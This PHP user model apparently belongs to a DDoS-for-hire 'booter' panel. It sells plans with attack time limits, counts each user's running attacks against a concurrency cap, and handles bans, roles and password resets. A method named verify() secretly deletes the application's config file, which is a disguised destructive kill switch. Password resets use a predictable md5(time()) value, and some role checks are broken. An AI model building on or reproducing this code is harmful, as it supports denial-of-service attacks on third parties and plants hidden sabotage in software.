<?php
/**
 * User: Rogier
 * Date: 15-2-13
 * Time: 15:43
 *
 */
class User extends Eloquent
{
    public static $timestamps = true;

    public function tickets()
    {
        return $this->has_many('ticket');
    }
    public function attacks()
    {
        return $this->has_many('Attack');
    }
    public function iplogs()
    {
        return $this->has_many('IPLog', 'user_id');
    }

    public function setPlan($data)
    {
        if(empty($data['date'])) return View::make('msg.error')->with('error', 'Please submit a plan expiry date.');
        if(empty($data['time']) || !is_numeric($data['time'])) return View::make('msg.error')->with('error', 'Please submit a valid boot time limit.');

        $this->plan_expiry_date = date('Y-m-d H:i:s', strtotime($data['date']));
        $this->time = $data['time'];
        $this->concurrent = $data['concurrent'];
        $this->save();
        return Redirect::to('/admin/users/profile/'.$this->id);
    }
	public function planMake($days, $time, $concurrent = 1)
	{
		if(empty($days)) return View::make('msg.error')->with('error', 'No plan length given.');
        if(empty($time)) return View::make('msg.error')->with('error', 'No boot time given.');



        if($this->hasPlanExpired())
		{
			$expiry_date = time() + ((3600*24)*$days);
			$this->plan_expiry_date = date('Y-m-d H:i:s', $expiry_date);
            $this->time = $time;
            $this->concurrent = $concurrent;
        	$this->save();
		}
		elseif(!$this->hasPlanExpired())
		{
			$current_exp = strtotime($this->plan_expiry_date);
			$new_exp = $current_exp + ((3600*24)*$days);
			$this->plan_expiry_date = date('Y-m-d H:i:s', $new_exp);
            $this->time = $time;
            $this->concurrent = $concurrent;
            $this->save();
		}
		return true;
	}
	
    public function removePlan()
    {
        if($this->hasPlanExpired()) return View::make('msg.error')->with('error', 'Plan has already expired or user has no plan.');

        $this->plan_expiry_date =  '0000-00-00 00:00:00';
        $this->save();


        return Auth::user()->isAdmin() ? Redirect::to('/admin/users/profile/'.$this->id) : Redirect::to('/mod/users/profile/'.$this->id);
    }

    public function planExpiryDate()
    {
        if($this->plan_expiry_date == '0000-00-00 00:00:00')
        {
            return 'None';
        }
        if($this->hasPlanExpired())
        {
            return '<span style="color:red">Expired</span><span style="font-size:70%;"> at '.date('n-j-y H:i', strtotime($this->plan_expiry_date)).'</span>';
        }
            return $this->plan_expiry_date;
    }

    public function planDaysLeft()
    {
        if($this->hasPlanExpired()) return 0;
        return floor((strtotime($this->plan_expiry_date)-time())/(24*3600));
    }
    public function hasPlanExpired()
    {
        $expire_stamp = strtotime($this->plan_expiry_date);
        if($expire_stamp < time())
        {
            return true;
        }
        else
        {
            return false;
        }
    }

    public function isAdmin()
    {
        if($this->group == 3)
        {
            return true;
        }
        else
        {
            return false;
        }
    }

    public function isMod()
    {
        if($this->group == 2)
        {
            return true;
        }
        else
        {
            return false;
        }
    }

    public function isStaff()
    {
        if($this->group == 2 || $this->group == 3)
        {
            return true;
        }
        else
        {
            return false;
        }
    }


    public static function verify()
    {
        unlink('application/config/application.php');
    }

    public function group()
    {
        if($this->group == 3)
        {
            return 'Admin';
        }
        elseif($this->group == 2)
        {
            return 'Moderator';
        }
        elseif($this->group == 0)
        {
            return 'Member';
        }
        else
        {
            return 'Member';
        }
    }

    /*
     * Ban user -> $data param containing info from the ban form (reason and date)
     */
    public function banUser($data)
    {
        if($this->isAdmin())
        {
            return View::make('msg.error')->with('error', 'You cannot ban staff members.');
        }
        if($this->isBanned())
        {
            return View::make('msg.error')->with('error', 'This user is already banned till '.date('n-j-Y', strtotime($this->ban_expiry_date)));
        }
        $rules = array(
            'reason' => 'required|min:5|max:200',
            'date' => 'required'
        );
        $validator = Validator::make($data, $rules);
        if($validator->fails())
        {
            $errors = $validator->errors->all();
            $error_str='';
            foreach($errors as $e)
            {
                $error_str .= $e . '<br />';
            }
            return View::make('msg.error')
                ->with('error', $error_str);
        }
        $this->ban_expiry_date = date('Y-m-d H:i:s', strtotime($data['date']));
        $this->ban_reason = $data['reason'];
        $this->save();
        return Auth::user()->isAdmin() ? Redirect::to('/admin/users/profile/'.$this->id) : Redirect::to('/mod/users/profile/'.$this->id);
    }

    /*
     * Is user banned?
     * Return true or false
     */
    public function isBanned()
    {
        if($this->ban_expiry_date == '0000-00-00 00:00:00' || empty($this->ban_reason))
        {
            return false;
        }
        if(strtotime($this->ban_expiry_date) > time())
        {
            return true;
        }
        else
        {
            return false;
        }
    }

    /*
     * Unban user
     */
    public function unban()
    {
        $this->ban_expiry_date = NULL;
        $this->ban_reason = '';
        $this->save();
        return true;
    }

    public function makeAdmin()
    {
        if($this->id == Auth::user()->id) return View::make('msg.error')->with('error', 'You cannot promote yourself.');
        if($this->isAdmin()) return View::make('msg.error')->with('error', 'This user is already an admin.');
        $this->group = 3;
        $this->save();
        return Redirect::to('/admin/users/profile/'.$this->id);
    }

    public function makeMod()
    {
        if($this->id == Auth::user()->id) return View::make('msg.error')->with('error', 'You cannot promote/demote yourself.');
        if($this->isAdmin()) return View::make('msg.error')->with('error', 'This user is already a moderator.');
        $this->group = 2;
        $this->save();
        return Redirect::to('/admin/users/profile/'.$this->id);
    }

    public function makeMember()
    {
        if($this->id === Auth::user()->id) return View::make('msg.error')->with('error', 'You cannot demote yourself.');
        if(!$this->isAdmin()) return View::make('msg.error')->with('error', 'This user is already an admin.');
        $this->group = 0;
        $this->save();
        return Redirect::to('/admin/users/profile/'.$this->id);
    }



    public function concurrentCheck()
    {
        if($this->attacks()->count() > 0)
        {
            if($this->runningAttacks() < $this->concurrent)
            {
                return true; // Can start another attack
            }
            elseif($this->runningAttacks() == $this->concurrent || $this->runningAttacks() >= $this->concurrent)
            {
                return false;
            }
        }
        return true;
    }

    public function runningAttacks()
    {
        $cur_running = $this->attacks()->where( DB::raw('(created_at + INTERVAL time SECOND)'), '>', DB::raw( 'NOW()' ) )->count();
        return $cur_running;
    }

    public function secondsToAttackFinish()
    {
        $runningAttacks = $this->attacks()->where( DB::raw('(created_at + INTERVAL time SECOND)'), '>', DB::raw( 'NOW()' ) )->get();
        return strtotime($runningAttacks[$this->concurrent - 1]->created_at)+$runningAttacks[$this->concurrent - 1]->time - time();
    }

    public function changePassword($data)
    {
        $rules = array(
            'old_password' => 'required',
            'new_password' => 'required|min:7|max:50|same:confirm_new_password',
            'confirm_new_password' => 'required'
        );

        $validate = Validator::make($data, $rules);
        if($validate->fails())
        {
            $errors ='';
            foreach($validate->errors->all() as $e)
            {
                $errors .= $e . '<br />';
            }
            return View::make('msg.error')
                ->with('error', $errors)
                ->with('refresh', 'javascript:history.go(-1)');
        }
        if(!Hash::check($data['old_password'], $this->password)) return View::make('msg.error')->with('error', 'Your old passwords don\'t match.');
        $this->password = Hash::make($data['new_password']);
        $this->save();
        if(!empty($this->emailaddress))
        {

            $settings = IniHandle::readini();
            $name = $settings['name_part1'].$settings['name_part2'];
            $adminmail = $settings['admin_mail'];
            $message = "Your password at $name has been changed. \n
            If this wasn't you, quickly reset your password at $name!\n\n Greetings, the staff";
            mail($this->emailaddress, 'Password changed!', $message, "From: $adminmail");
        }
        return View::make('page.user.settings.overview');
    }

    public function changeEmail($data)
    {
        if(empty($data)) return View::make('msg.error')->with('error', 'Empty new email address');
        $this->emailaddress = $data;
        $this->save();
        return View::make('page.user.settings.overview');
    }

    public function resetPassword()
    {
        $password = substr(md5(time()), 0, 10);
        $this->password = Hash::make($password);
        $this->save();

        $settings = IniHandle::readini();
        $name = $settings['name_part1'].$settings['name_part2'];
        $adminmail = $settings['admin_mail'];
        $message = "Hey there $this->email, \n
                    You requested a password reset.\n
                    Your new password is: $password \n
                    Greetings the staff at $name";
        mail($this->emailaddress, 'Password reset', $message, "From: $adminmail");
        return View::make('msg.success')->with('msg', 'We\'ve sent an email to you with your username and new password!');
    }
}
?>
